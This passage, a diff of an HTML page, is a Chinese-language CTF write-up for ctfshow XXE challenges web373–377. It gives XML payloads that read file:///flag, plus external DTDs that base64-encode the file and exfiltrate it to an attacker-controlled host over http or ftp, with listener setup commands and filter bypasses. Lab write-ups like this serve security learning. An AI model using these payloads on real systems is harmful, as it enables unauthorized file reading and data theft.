@@ -139,33 +139,27 @@
   <div class="content" itemprop="articleBody">
     <h2 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h2><p>用burp post下面的数据</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
 <h2 id="web374"><a href="#web374" class="headerlink" title="web374"></a>web374</h2><p>无回显XXE</p>
 <p>可以用python构造一个静态服务器 (这里监听和静态服务是一个端口)</p>
 <p><code>python3 -m http.server 8000</code></p>
 <p>payload: </p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [<span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://xxx.xx.xxx.78:8000/test.dtd&quot;</span>&gt;</span>%xxe;]&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p>test.dtd文件:</p>
 <p>(flag必须base64这样编码才打得通,不知道是不是服务器的问题=.=)</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http:&#x2F;&#x2F;xxx.xx.xxx.78:8000&#x2F;?x&#x3D;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate;</span><br></pre></td></tr></table></figure>
-
 <p>服务器端数据base64解码即可</p>
 <p><img src="1610082443757.png" alt="1610082443757"></p>
 <h2 id="web375-376"><a href="#web375-376" class="headerlink" title="web375 376"></a>web375 376</h2><p>存在过滤,用空格绕过即可</p>
 <p>payload:</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml  version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [<span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://xxx.xx.xxx.78:8000/test.dtd&quot;</span>&gt;</span> %xxe;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p><img src="1610082443757.png" alt="1610082443757"></p>
 <h2 id="web377"><a href="#web377" class="headerlink" title="web377"></a>web377</h2><p>禁用了http,可以考虑别的协议,像ftp等</p>
 <p>搭建ftp 服务 python -m pyftpdlib -p 8001 (打的时候把安全组关了)</p>
 <p>开http服务监听 python3 -m http.server 8000</p>
 <p>payload:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml  version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;ftp:&#x2F;&#x2F;xxx.xx.xxx.78:8001&#x2F;test.dtd&quot;&gt; %xxe;]&gt;</span><br><span class="line">&lt;root&gt;&lt;ctfshow&gt;&amp;xxe;&lt;&#x2F;ctfshow&gt;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>
-
 <p>test.dtd</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http:&#x2F;&#x2F;xxx.xx.xxx.78:8000&#x2F;?x&#x3D;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate;</span><br></pre></td></tr></table></figure>
-
 <p><img src="1610090109891.png" alt="1610090109891"></p>
 
   </div>
